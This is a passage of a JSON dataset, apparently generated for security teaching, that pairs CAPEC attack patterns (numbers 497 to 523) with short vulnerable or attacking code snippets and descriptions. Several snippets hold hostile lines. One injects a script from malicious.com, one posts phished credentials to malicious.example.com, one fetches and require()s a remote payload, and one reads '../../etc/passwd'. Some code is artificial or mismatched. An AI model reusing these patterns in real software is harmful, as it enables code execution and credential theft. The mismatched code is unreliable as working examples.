        "description": "This JavaScript code snippet demonstrates a basic form of an ICMP Fragmentation attack using UDP packets. The code creates a UDP client and sends a large number of maximum-sized UDP packets to a target host. This can overwhelm the target's resources, leading to potential denial of service. The code embodies CWE-770 by not limiting the number of packets sent, CWE-404 by not properly handling resource release, and CWE-319 by potentially sending data in cleartext. The main idea is to show how resource exhaustion can be achieved through network packet flooding."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Vulnerable function to check for the existence of a sensitive file\nfunction checkSensitiveFile(filePath) {\n  try {\n    const fullPath = path.join(__dirname, filePath);\n    if (fs.existsSync(fullPath)) {\n      console.log('Sensitive file exists:', fullPath);\n      // Potentially expose sensitive information\n      const fileContent = fs.readFileSync(fullPath, 'utf8');\n      console.log('File content:', fileContent);\n    } else {\n      console.log('File does not exist:', fullPath);\n    }\n  } catch (err) {\n    console.error('Error accessing file:', err);\n  }\n}\n\n// Example usage\ncheckSensitiveFile('../../etc/passwd');",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that checks for the existence of a sensitive file based on a user-supplied file path. The function `checkSensitiveFile` takes a file path as input, constructs the full path, and checks if the file exists. If the file exists, it reads and logs the file's content. This code embodies the main idea of the CAPEC 'File Discovery' by allowing an adversary to probe for the existence of sensitive files. The related CWEs are represented as follows: CWE-73 (External Control of File Name or Path) is demonstrated by allowing user input to influence the file path, CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) is shown by potentially exposing the content of sensitive files, and CWE-529 (Exposure of Access Control List Files to an Unauthorized Control Sphere) is implied by the potential exposure of sensitive files that should be protected."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "document.addEventListener('visibilitychange', function() {\n  if (document.hidden) {\n    // Simulate sensitive information being exposed in a screenshot\n    document.getElementById('sensitive-info').style.display = 'block';\n  } else {\n    document.getElementById('sensitive-info').style.display = 'none';\n  }\n});\n\n// Example of sensitive information\nlet sensitiveInfo = document.createElement('div');\nsensitiveInfo.id = 'sensitive-info';\nsensitiveInfo.style.display = 'none';\nsensitiveInfo.innerText = 'User Password: 12345';\ndocument.body.appendChild(sensitiveInfo);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where sensitive information is exposed when an application is sent to the background. The 'visibilitychange' event listener checks if the document is hidden (i.e., the app is in the background). If it is, it displays a div containing sensitive information, simulating the exposure of such information in a screenshot. This represents the CAPEC 'Probe iOS Screenshots' by showing how sensitive data can be inadvertently exposed when an app is not actively in use. The code also touches on CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor) by displaying sensitive information without proper authorization checks."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "const intentFilter = new IntentFilter();\nintentFilter.addAction('com.example.SENSITIVE_ACTION');\n\nconst receiver = new BroadcastReceiver({\n  onReceive: (context, intent) => {\n    const data = intent.getStringExtra('sensitiveData');\n    console.log('Received sensitive data:', data);\n  }\n});\n\ncontext.registerReceiver(receiver, intentFilter);",
        "description": "This JavaScript code snippet represents an Android BroadcastReceiver that listens for an implicit intent with the action 'com.example.SENSITIVE_ACTION'. The receiver extracts sensitive data from the intent without verifying the source of the intent. This demonstrates the vulnerability described in the CAPEC, where a malicious application can intercept intents from a trusted application. The code also embodies CWE-925 (Improper Verification of Intent by Broadcast Receiver) and CWE-927 (Use of Implicit Intent for Sensitive Communication), as it does not verify the sender of the intent and uses an implicit intent to transmit sensitive data."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "const webView = document.getElementById('webView');\n\n// Exposed dangerous method\nwebView.addEventListener('load', function() {\n    // Injecting malicious script into the WebView\n    webView.contentWindow.eval(`\n        document.cookie = 'sessionId=maliciousSessionId';\n        document.body.innerHTML += '<script src=\"http://malicious.com/malware.js\"></script>';\n    `);\n});\n\n// Improper verification of source\nif (webView.src !== 'https://trustedsource.com') {\n    console.warn('Untrusted source loaded in WebView');\n}\n\n// Client-side enforcement of server-side security\nif (document.cookie.includes('sessionId')) {\n    // Assuming the presence of a sessionId cookie is enough for authentication\n    console.log('User authenticated');\n}",
        "description": "This JavaScript code snippet demonstrates a WebView Injection attack. The code listens for the 'load' event on a WebView element and injects malicious code into the web page displayed by the WebView. The injected code manipulates cookies and adds a script from a malicious source, representing CWE-749 (Exposed Dangerous Method or Function) and CWE-506 (Embedded Malicious Code). The code also checks the source of the WebView content but does not enforce any security measures, illustrating CWE-940 (Improper Verification of Source of a Communication Channel). Additionally, it relies on the presence of a sessionId cookie for authentication without proper validation, representing CWE-784 (Reliance on Cookies without Validation and Integrity Checking in a Security Decision) and CWE-602 (Client-Side Enforcement of Server-Side Security)."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "import android.app.Activity;\nimport android.content.Intent;\nimport android.os.Bundle;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        // Implicit Intent to launch a trusted activity\n        Intent intent = new Intent(\"com.example.TRUSTED_ACTIVITY\");\n        startActivity(intent);\n    }\n}\n\n// MaliciousActivity mimicking the trusted activity\npublic class MaliciousActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_malicious);\n\n        // Mimic the trusted activity's UI\n        // Prompt user to enter sensitive data\n    }\n}",
        "description": "This code snippet demonstrates a vulnerable Android application where an implicit intent is used to launch a trusted activity. The MainActivity class sends an implicit intent to start an activity identified by the action 'com.example.TRUSTED_ACTIVITY'. However, due to the use of an implicit intent, a malicious activity (MaliciousActivity) can intercept this intent and launch itself instead. The MaliciousActivity mimics the trusted activity's user interface and prompts the user to enter sensitive data, exploiting the vulnerability described in the CAPEC. This example highlights the risks associated with CWE-927 (Use of Implicit Intent for Sensitive Communication) and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints)."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Vulnerable endpoint that processes incoming requests\napp.post('/processData', (req, res) => {\n  // Improper access control: No verification of the request source\n  const data = req.body.data;\n  // Process the data without validation\n  console.log('Processing data:', data);\n  res.send('Data processed');\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable Express.js server endpoint that processes incoming POST requests. The endpoint '/processData' does not verify the source of the request, embodying the concept of 'Intent Spoof' from CAPEC. This lack of verification allows an adversary to send malicious requests to the endpoint, potentially leading to data modification, information disclosure, or data injection. The code also reflects CWE-284 (Improper Access Control) as it does not restrict access to the resource, and CWE-941 (Incorrectly Specified Destination in a Communication Channel) as it does not correctly specify or verify the intended destination of the request."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "class MyAppInterface {\n  @JavascriptInterface\n  public void showToast(String toast) {\n    Toast.makeText(context, toast, Toast.LENGTH_SHORT).show();\n  }\n}\n\nWebView myWebView = (WebView) findViewById(R.id.webview);\nmyWebView.getSettings().setJavaScriptEnabled(true);\nmyWebView.addJavascriptInterface(new MyAppInterface(), \"Android\");\nmyWebView.loadUrl(\"http://example.com\");",
        "description": "This Java code snippet demonstrates the vulnerability described in the CAPEC 'WebView Exposure'. The code registers a JavaScript interface to a WebView using the addJavascriptInterface API. The interface exposes a method 'showToast' that can be called from any web page loaded in the WebView. This can lead to improper access control (CWE-284) as any loaded web page can access the 'showToast' method. Additionally, it exposes a potentially dangerous method (CWE-749) that could be exploited by a malicious web page. The WebView is enabled to execute JavaScript, which can lead to cross-site scripting (CWE-79) if the loaded web page contains malicious scripts. This example highlights the risk of exposing application-specific functionality to web pages without proper restrictions."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  // Create an iframe to impersonate a legitimate task\n  var iframe = document.createElement('iframe');\n  iframe.style.position = 'absolute';\n  iframe.style.top = '0';\n  iframe.style.left = '0';\n  iframe.style.width = '100%';\n  iframe.style.height = '100%';\n  iframe.style.zIndex = '1000';\n  iframe.src = 'https://legitimate-site.com/login'; // URL of the legitimate task\n  document.body.appendChild(iframe);\n\n  // Capture user input from the impersonated task\n  iframe.onload = function() {\n    var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;\n    iframeDoc.addEventListener('submit', function(event) {\n      event.preventDefault();\n      var formData = new FormData(event.target);\n      var data = {};\n      formData.forEach((value, key) => { data[key] = value; });\n      console.log('Captured Data:', data); // Log captured data (malicious intent)\n    });\n  };\n});",
        "description": "This JavaScript code snippet demonstrates a task impersonation attack by creating an iframe that overlays the entire webpage, impersonating a legitimate login task. The iframe loads a legitimate-looking login page from 'https://legitimate-site.com/login'. When the user interacts with this iframe and submits their credentials, the script captures the input data and logs it, representing a malicious attempt to steal sensitive information. This example embodies the CAPEC concept of task impersonation and leverages CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by overlaying the iframe, CWE-506 (Embedded Malicious Code) by including malicious code to capture data, and CWE-285 (Improper Authorization) by not properly authorizing the action of capturing user input."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "window.onload = function() {\n  if (window.location.protocol === 'custom-scheme:') {\n    // CWE-939: Improper Authorization in Handler for Custom URL Scheme\n    var params = new URLSearchParams(window.location.search);\n    var sensitiveData = params.get('data'); // CWE-598: Use of GET Request Method With Sensitive Query Strings\n    if (sensitiveData) {\n      // CWE-506: Embedded Malicious Code\n      document.body.innerHTML = '<form id=\"phishForm\"><input type=\"text\" name=\"username\" placeholder=\"Username\"><input type=\"password\" name=\"password\" placeholder=\"Password\"><button type=\"submit\">Login</button></form>';\n      document.getElementById('phishForm').onsubmit = function() {\n        var username = this.username.value;\n        var password = this.password.value;\n        // Send credentials to malicious server\n        fetch('https://malicious.example.com/steal', {\n          method: 'POST',\n          headers: {'Content-Type': 'application/json'},\n          body: JSON.stringify({username: username, password: password})\n        });\n        return false;\n      };\n    }\n  }\n};",
        "description": "This JavaScript code snippet demonstrates a Scheme Squatting attack. When a custom URL scheme (e.g., 'custom-scheme:') is detected, the code extracts sensitive data from the URL query string (CWE-598). It then displays a fake login form (CWE-506) to phish for user credentials. When the form is submitted, the credentials are sent to a malicious server. This attack leverages improper authorization in the handler for the custom URL scheme (CWE-939) to intercept messages intended for a legitimate application and trick users into providing sensitive information."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  // Create a transparent overlay\n  var overlay = document.createElement('div');\n  overlay.style.position = 'absolute';\n  overlay.style.top = '0';\n  overlay.style.left = '0';\n  overlay.style.width = '100%';\n  overlay.style.height = '100%';\n  overlay.style.opacity = '0';\n  overlay.style.zIndex = '1000';\n  document.body.appendChild(overlay);\n\n  // Create a hidden button that will be clicked\n  var hiddenButton = document.createElement('button');\n  hiddenButton.style.position = 'absolute';\n  hiddenButton.style.top = '50%';\n  hiddenButton.style.left = '50%';\n  hiddenButton.style.transform = 'translate(-50%, -50%)';\n  hiddenButton.style.zIndex = '1001';\n  hiddenButton.style.opacity = '0';\n  hiddenButton.onclick = function() {\n    alert('Hidden button clicked!');\n  };\n  document.body.appendChild(hiddenButton);\n\n  // Simulate a user tap on the overlay\n  overlay.addEventListener('click', function() {\n    hiddenButton.click();\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a basic example of a tapjacking attack. When the DOM content is loaded, it creates a transparent overlay that covers the entire screen. This overlay is positioned above the main content (zIndex 1000) and is fully transparent (opacity 0). Additionally, a hidden button is created and positioned at the center of the screen with a higher zIndex (1001) and also fully transparent. When the user clicks anywhere on the overlay, the click event is passed through to the hidden button, triggering its click event and displaying an alert. This simulates the tapjacking technique where the user is misled into interacting with a hidden element, potentially leading to unauthorized actions. The code also touches on related CWEs such as improper restriction of UI layers (CWE-1021) and UI misrepresentation (CWE-451)."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "const fs = require('fs');\n\n// Sensitive information stored in a file without proper access control\nconst sensitiveData = 'User: admin, Password: secret123';\nfs.writeFileSync('sensitive_info.txt', sensitiveData);\n\n// Function to read sensitive information from the file\nfunction readSensitiveData() {\n  try {\n    const data = fs.readFileSync('sensitive_info.txt', 'utf8');\n    console.log('Sensitive Data:', data);\n  } catch (err) {\n    console.error('Error reading file:', err);\n  }\n}\n\n// Simulate physical access by calling the function\nreadSensitiveData();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Physical Theft' by storing sensitive information in a file without proper access control mechanisms. The sensitive data is written to a file named 'sensitive_info.txt'. The function 'readSensitiveData' reads and prints the sensitive information from the file. This code is vulnerable because it does not implement any access control, encryption, or protection mechanisms, making it easy for an adversary with physical access to the system to retrieve the sensitive information. This embodies the CAPEC's main idea and highlights related CWEs such as 'Improper Physical Access Control' and 'Insecure Storage of Sensitive Information'."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "document.getElementById('passwordInput').addEventListener('input', function() {\n  var password = this.value;\n  console.log('Password entered: ' + password); // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n});\n\n// Simulating cleartext transmission of sensitive information (CWE-319)\nfunction sendPassword() {\n  var password = document.getElementById('passwordInput').value;\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', 'http://example.com/login', true);\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send('password=' + password); // CWE-319: Cleartext Transmission of Sensitive Information\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information, specifically a password, is exposed to potential shoulder surfing attacks. The code logs the password to the console (CWE-200), making it visible to anyone with access to the console. Additionally, the password is transmitted in cleartext over an HTTP connection (CWE-319), which can be intercepted by unauthorized actors. This snippet highlights the risks associated with improper handling and transmission of sensitive information, making it vulnerable to shoulder surfing and other forms of unauthorized access."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "const crypto = require('crypto');\nconst fs = require('fs');\n\n// Simulate obtaining a service ticket encrypted with RC4\nfunction getServiceTicket() {\n  const ticket = 'fakeServiceTicket'; // Placeholder for actual service ticket\n  const key = 'weakpassword'; // Weak password (CWE-521)\n  const cipher = crypto.createCipher('rc4', key);\n  let encrypted = cipher.update(ticket, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Save the ticket to disk (CWE-522)\nfunction saveTicketToDisk(ticket) {\n  fs.writeFileSync('ticket.txt', ticket);\n}\n\n// Simulate brute-forcing the ticket (CWE-308, CWE-309)\nfunction bruteForceTicket() {\n  const encryptedTicket = fs.readFileSync('ticket.txt', 'utf8');\n  const possibleKeys = ['weakpassword', '123456', 'password']; // Weak password list\n  for (const key of possibleKeys) {\n    const decipher = crypto.createDecipher('rc4', key);\n    let decrypted;\n    try {\n      decrypted = decipher.update(encryptedTicket, 'hex', 'utf8');\n      decrypted += decipher.final('utf8');\n      if (decrypted === 'fakeServiceTicket') {\n        console.log('Key found:', key);\n        return key;\n      }\n    } catch (err) {\n      // Ignore decryption errors\n    }\n  }\n  console.log('Key not found');\n  return null;\n}\n\nconst ticket = getServiceTicket();\nsaveTicketToDisk(ticket);\nbruteForceTicket();",
        "description": "This JavaScript code snippet simulates the Kerberoasting attack described in the CAPEC. It demonstrates how an attacker can exploit weak password requirements (CWE-521) and insufficiently protected credentials (CWE-522) to obtain and brute-force a service ticket. The code first simulates obtaining a service ticket encrypted with RC4 using a weak password. It then saves the encrypted ticket to disk, representing the insecure storage of credentials. Finally, it attempts to brute-force the ticket using a list of weak passwords, highlighting the risks associated with single-factor authentication (CWE-308) and the use of password systems for primary authentication (CWE-309)."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "const maliciousApp = () => {\n  const trustedUserSession = getSessionFromTrustedUser(); // CWE-346: Origin Validation Error\n  const saasEndpoint = 'https://saas.example.com/api/performAction';\n  const maliciousPayload = {\n    action: 'deleteUser',\n    userId: '12345'\n  };\n\n  fetch(saasEndpoint, {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'Authorization': `Bearer ${trustedUserSession.token}` // CWE-863, CWE-285: Incorrect/Improper Authorization\n    },\n    body: JSON.stringify(maliciousPayload)\n  })\n  .then(response => response.json())\n  .then(data => console.log('Action performed:', data))\n  .catch(error => console.error('Error:', error));\n};\n\n// Simulate the execution of the malicious app\nmaliciousApp();",
        "description": "This JavaScript code snippet represents a SaaS User Request Forgery attack. The `maliciousApp` function simulates a malicious application that leverages a trusted user's session to perform unauthorized actions on a SaaS application. The function retrieves the session token of a trusted user (CWE-346: Origin Validation Error) and uses it to send a malicious request to the SaaS application's API endpoint. The request includes a payload to delete a user, exploiting the fact that the SaaS application incorrectly or improperly authorizes the request (CWE-863, CWE-285). This demonstrates how an attacker can 'piggy-back' on an authenticated session to perform actions at the trusted user's privilege level."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-215: Insertion of Sensitive Information Into Debugging Code\nconst sensitiveInfo = 'API_KEY=12345';\nconsole.log(`Debug: Sensitive Info - ${sensitiveInfo}`);\n\n// CWE-434: Unrestricted Upload of File with Dangerous Type\nfunction uploadFile(file) {\n  const uploadPath = path.join(__dirname, 'uploads', file.name);\n  fs.writeFileSync(uploadPath, file.data);\n  console.log('File uploaded successfully');\n}\n\n// CWE-506: Embedded Malicious Code\nfunction maliciousCode() {\n  fs.writeFileSync('/tmp/malicious.txt', 'This is a malicious file');\n  console.log('Malicious code executed');\n}\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nfunction getSystemInfo() {\n  const systemInfo = {\n    user: process.env.USER,\n    homeDir: process.env.HOME,\n    osType: process.platform\n  };\n  console.log(`System Info: ${JSON.stringify(systemInfo)}`);\n  return systemInfo;\n}\n\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nfunction exposeSensitiveInfo() {\n  const sensitiveData = getSystemInfo();\n  console.log(`Exposing sensitive data: ${JSON.stringify(sensitiveData)}`);\n}\n\n// Simulate an attack by calling the functions\nuploadFile({ name: 'dangerous.exe', data: 'malicious content' });\nmaliciousCode();\nexposeSensitiveInfo();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities that align with the CAPEC description of infiltrating a software development environment. The code includes: \n1. CWE-215: Sensitive information (API key) is inserted into debugging code, which is logged to the console.\n2. CWE-434: A function that allows unrestricted upload of files, including potentially dangerous types.\n3. CWE-506: A function that writes a malicious file to the system, simulating embedded malicious code.\n4. CWE-497: A function that retrieves and logs sensitive system information, exposing it to unauthorized control spheres.\n5. CWE-200: A function that exposes sensitive system information to unauthorized actors by logging it to the console.\n\nThe code simulates an attack by calling these functions, demonstrating how an attacker could infiltrate an IDE environment, upload malicious files, execute malicious code, and expose sensitive information."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "class HardwareComponent {\n  constructor(name, version) {\n    this.name = name;\n    this.version = version;\n    this.trusted = false; // CWE-1357: Component is not sufficiently trusted\n  }\n\n  updateFirmware(newVersion) {\n    if (this.isUpdateable()) {\n      this.version = newVersion;\n    } else {\n      console.log('Component cannot be updated.'); // CWE-1329: Component is not updateable\n    }\n  }\n\n  isUpdateable() {\n    // Simulate a check for updateability\n    return Math.random() > 0.5; // 50% chance the component is not updateable\n  }\n\n  performOperation() {\n    if (this.trusted) {\n      console.log('Performing secure operation.');\n    } else {\n      console.log('Warning: Untrusted component in use!'); // CWE-1357: Insufficiently trustworthy component\n    }\n  }\n}\n\n// Simulate the substitution of a malicious component during baselining\nlet component = new HardwareComponent('Sensor', '1.0');\ncomponent.trusted = false; // Malicious substitution\ncomponent.performOperation();\n\n// Attempt to update the firmware\ncomponent.updateFirmware('1.1');\ncomponent.performOperation();",
        "description": "This JavaScript code snippet simulates the substitution of a malicious hardware component during the baselining phase of product development. The `HardwareComponent` class represents a hardware component with properties for its name, version, and trust status. The `updateFirmware` method attempts to update the component's firmware, but it may fail if the component is not updateable (CWE-1329). The `performOperation` method checks if the component is trusted before performing a secure operation, warning if the component is untrusted (CWE-1357). The code demonstrates how an adversary could substitute a malicious component that is not sufficiently trustworthy, potentially leading to security vulnerabilities in the final product."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "const fs = require('fs');\n\n// CWE-1263: Improper Physical Access Control\nconst sensitiveFilePath = '/path/to/sensitive/documentation.txt';\n\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nfunction readSensitiveFile(filePath) {\n  try {\n    const data = fs.readFileSync(filePath, 'utf8');\n    return data;\n  } catch (err) {\n    console.error('Error reading file:', err);\n    return null;\n  }\n}\n\n// CWE-1059: Insufficient Technical Documentation\nfunction alterDocumentation(data) {\n  // CWE-695: Use of Low-Level Functionality\n  // Directly manipulating the file content\n  const alteredData = data.replace(/restricted technology/g, 'allowed technology');\n  return alteredData;\n}\n\n// CWE-222: Truncation of Security-relevant Information\nfunction saveAlteredDocumentation(filePath, data) {\n  const truncatedData = data.substring(0, 1000); // Truncate to obscure changes\n  fs.writeFileSync(filePath, truncatedData, 'utf8');\n}\n\nconst sensitiveData = readSensitiveFile(sensitiveFilePath);\nif (sensitiveData) {\n  const alteredData = alterDocumentation(sensitiveData);\n  saveAlteredDocumentation(sensitiveFilePath, alteredData);\n  console.log('Documentation altered successfully.');\n} else {\n  console.log('Failed to read sensitive documentation.');\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker with physical access to sensitive documentation (CWE-1263) reads the file and alters its content to circumvent restrictions on advanced technology. The code reads a sensitive file (CWE-200), modifies its content to replace 'restricted technology' with 'allowed technology' (CWE-1059, CWE-695), and then saves the altered content back to the file, truncating it to obscure the changes (CWE-222). This represents the main idea of the CAPEC, where an attacker alters documentation to bypass dial-down functionality requirements, potentially exposing restricted technology to unauthorized entities."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "/* Insufficient Technical Documentation and Missing Design Documentation */\n// This function is supposed to handle user authentication\n// However, the documentation is altered to mislead developers\n// and the function is intentionally left incomplete and insecure\n\n/**\n * Authenticates a user based on username and password\n * @param {string} username - The username of the user\n * @param {string} password - The password of the user\n * @returns {boolean} - Returns true if authentication is successful, false otherwise\n */\nfunction authenticateUser(username, password) {\n  // Documentation claims this is a secure hash function\n  // In reality, it's a simple and insecure comparison\n  if (username === 'admin' && password === 'password123') {\n    return true;\n  }\n  return false;\n}\n\n// Exposure of Sensitive System Information\n// The following line exposes sensitive information\nconsole.log('Admin credentials are admin/password123');\n\n// Improper Following of Specification by Caller\n// The caller does not follow the proper specification for secure authentication\nlet isAuthenticated = authenticateUser('admin', 'password123');\nconsole.log('User authenticated:', isAuthenticated);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker has altered the documentation to mislead developers into creating an under-performing and insecure system. The function `authenticateUser` is supposed to handle user authentication securely, but the documentation is altered to mislead developers into thinking it uses a secure hash function. Instead, it performs a simple and insecure comparison. Additionally, sensitive information is exposed via a console log, and the caller does not follow proper specifications for secure authentication. This embodies the main idea of the CAPEC by showing how altered documentation can lead to system vulnerabilities."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "const config = { maxRetries: 3, timeout: 5000 }; // Original documentation: { maxRetries: 5, timeout: 10000 }\n\nfunction fetchData(url) {\n    let retries = 0;\n    return new Promise((resolve, reject) => {\n        function attemptFetch() {\n            fetch(url, { timeout: config.timeout })\n                .then(response => {\n                    if (!response.ok) {\n                        throw new Error('Network response was not ok');\n                    }\n                    return response.json();\n                })\n                .then(data => resolve(data))\n                .catch(error => {\n                    if (retries < config.maxRetries) {\n                        retries++;\n                        attemptFetch();\n                    } else {\n                        reject(error);\n                    }\n                });\n        }\n        attemptFetch();\n    });\n}\n\n// Usage\nfetchData('https://example.com/api/data')\n    .then(data => console.log(data))\n    .catch(error => console.error('Fetch error:', error));",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker has altered the documentation to cause errors in system design. The original documentation specified a configuration with `maxRetries: 5` and `timeout: 10000`, but the attacker has changed it to `maxRetries: 3` and `timeout: 5000`. This alteration can lead to unexpected behavior, such as increased failure rates in network requests due to insufficient retries and shorter timeouts. The code also highlights CWE-1059 (Insufficient Technical Documentation) and CWE-1053 (Missing Documentation for Design) by showing how incorrect or missing documentation can lead to improper implementation. Additionally, it touches on CWE-573 (Improper Following of Specification by Caller) and CWE-684 (Incorrect Provision of Specified Functionality) by demonstrating how the altered configuration can cause the function to not perform as expected."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "class TrustedComponent {\n  constructor() {\n    this.name = 'TrustedComponent';\n  }\n  performTask() {\n    console.log('Performing trusted task');\n  }\n}\n\nclass CounterfeitComponent extends TrustedComponent {\n  constructor() {\n    super();\n    this.name = 'CounterfeitComponent';\n  }\n  performTask() {\n    // Malicious behavior\n    console.log('Performing malicious task');\n    this.stealData();\n  }\n  stealData() {\n    console.log('Stealing sensitive data');\n  }\n}\n\n// Simulate product assembly\nfunction assembleProduct(useCounterfeit) {\n  let component;\n  if (useCounterfeit) {\n    component = new CounterfeitComponent();\n  } else {\n    component = new TrustedComponent();\n  }\n  component.performTask();\n}\n\n// Example usage\nassembleProduct(true); // Using counterfeit component\nassembleProduct(false); // Using trusted component",
        "description": "This JavaScript code snippet simulates the insertion of a counterfeit hardware component during product assembly. The `TrustedComponent` class represents a legitimate component, while the `CounterfeitComponent` class extends it to introduce malicious behavior, such as stealing data. The `assembleProduct` function decides whether to use the trusted or counterfeit component based on the `useCounterfeit` flag. This code embodies the CAPEC idea by demonstrating how a counterfeit component can be introduced to perform malicious tasks, leveraging related CWEs like embedded malicious code (CWE-506) and reliance on insufficiently trustworthy components (CWE-1357)."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "const hardwareSpecs = {\n  registerDefaults: {\n    secureRegister: 0x00, // CWE-1221: Incorrect default value\n    debugMode: true // CWE-1296: Incorrect chaining of debug components\n  },\n  lockBit: false // CWE-1231: Improper prevention of lock bit modification\n};\n\n// CWE-657: Violation of secure design principles\nfunction initializeHardware(specs) {\n  if (!specs) {\n    throw new Error('Insufficient technical documentation'); // CWE-1059\n  }\n  // Simulate altering hardware design specifications\n  specs.registerDefaults.secureRegister = 0xFF; // Insecure value set by attacker\n  specs.lockBit = true; // Lock bit set but can be modified later\n  console.log('Hardware initialized with specs:', specs);\n}\n\ninitializeHardware(hardwareSpecs);",
        "description": "This JavaScript code snippet simulates the alteration of hardware design specifications by an attacker. The `hardwareSpecs` object contains insecure default values for registers (CWE-1221) and debug components (CWE-1296), and a lock bit that can be modified after being set (CWE-1231). The `initializeHardware` function checks for the presence of technical documentation (CWE-1059) and then alters the hardware specifications, violating secure design principles (CWE-657). This represents the main idea of the CAPEC, where an attacker with access to hardware manufacturing documentation introduces flaws advantageous to them once the system is deployed."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "class HardwareComponent {\n  constructor() {\n    this.updateable = false; // CWE-1329: Component is not updateable\n    this.trustworthy = false; // CWE-1357: Insufficiently trustworthy component\n  }\n\n  performOperation() {\n    if (this.trustworthy) {\n      console.log('Performing secure operation');\n    } else {\n      this.injectMaliciousCode(); // CWE-506: Embedded malicious code\n    }\n  }\n\n  injectMaliciousCode() {\n    console.log('Malicious code executed');\n    // Malicious actions here\n  }\n}\n\n// Simulating the replacement of a legitimate hardware component with a malicious one\nlet component = new HardwareComponent();\ncomponent.performOperation();",
        "description": "This JavaScript code snippet simulates the replacement of a legitimate hardware component with a malicious one, embodying the main idea of CAPEC-452: Malicious Hardware Component Replacement. The `HardwareComponent` class has properties that indicate it is not updateable (CWE-1329) and not trustworthy (CWE-1357). The `performOperation` method checks if the component is trustworthy; if not, it executes malicious code (CWE-506). This represents the scenario where an adversary replaces legitimate hardware with a tampered component that can perform malicious actions."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// CWE-1395: Dependency on Vulnerable Third-Party Component\nconst vulnerableLib = require('vulnerable-lib');\n\n// CWE-506: Embedded Malicious Code\nfunction maliciousFunction() {\n  // CWE-509: Replicating Malicious Code (Virus or Worm)\n  http.get('http://malicious-server.com/payload', (res) => {\n    let data = '';\n    res.on('data', (chunk) => { data += chunk; });\n    res.on('end', () => {\n      fs.writeFileSync('/tmp/malicious_payload.js', data);\n      require('/tmp/malicious_payload.js');\n    });\n  });\n}\n\n// CWE-1229: Creation of Emergent Resource\nfunction createEmergentResource() {\n  fs.writeFileSync('/tmp/emergent_resource.txt', 'This is an emergent resource.');\n}\n\n// CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nfunction injectErrors() {\n  console.error('Injected error to degrade system redundancy');\n}\n\n// Main function to simulate the malicious software implantation\nfunction main() {\n  if (vulnerableLib.isVulnerable()) {\n    maliciousFunction();\n    createEmergentResource();\n    injectErrors();\n  }\n}\n\nmain();",
